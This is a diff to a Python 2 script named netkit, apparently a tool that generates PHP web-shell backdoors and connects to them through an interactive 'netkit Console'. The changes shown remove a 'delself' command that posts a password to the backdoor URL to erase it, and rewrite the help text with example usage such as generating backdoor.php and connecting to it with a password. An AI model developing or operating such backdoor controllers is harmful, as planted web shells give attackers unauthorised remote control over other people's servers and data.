@@ -69,13 +69,7 @@ if len(sys.argv) == 4:
 		    print "###################"
 		    while True:
 			rcmd = raw_input(bcolors.BOLD+bcolors.FAIL+"netkit Console > " +bcolors.ENDC)
-			if rcmd == "delself": #Delete backdoor
-			    urllib2.urlopen(sta2)
-			    data = urllib.urlencode({'delself' : "1", 'pass'  : sta3})
-			    req = urllib2.Request(sta2, data)
-			    print "Succesfully"
-			    break
-			elif rcmd == "exit": #Exit Control Panel
+			if rcmd == "exit": #Exit Control Panel
 			    break
 			elif rcmd == "clear": # Clear Terminal
 			    os.system("clear")
@@ -120,11 +114,10 @@ if len(sys.argv) == 4:
 elif len(sys.argv) == 2:
     if sys.argv[1] == "--help": # Help Menu NO Connected
 	print bcolors.BOLD + """
-	netkit --generate <filename> <password>
-	netkit --connect <url> <password>
-netkit --generate backdoor.php abc123
-netkit --connect http://localhost/netkit/backdoor.php abc123
-netkit --help
+python netkit.py --generate <filename> <password>
+python netkit.py --connect <url> <password>
+python netkit.py --connect http://localhost/netkit/backdoor.php abc123
+python netkit.py --help
 """ + bcolors.ENDC
 else:
-    print bcolors.BOLD + bcolors.FAIL + "You entered the missing parameter..." + bcolors.ENDC
+    print bcolors.BOLD + bcolors.FAIL + "You entered the missing parameter , If you want help : --help" + bcolors.ENDC
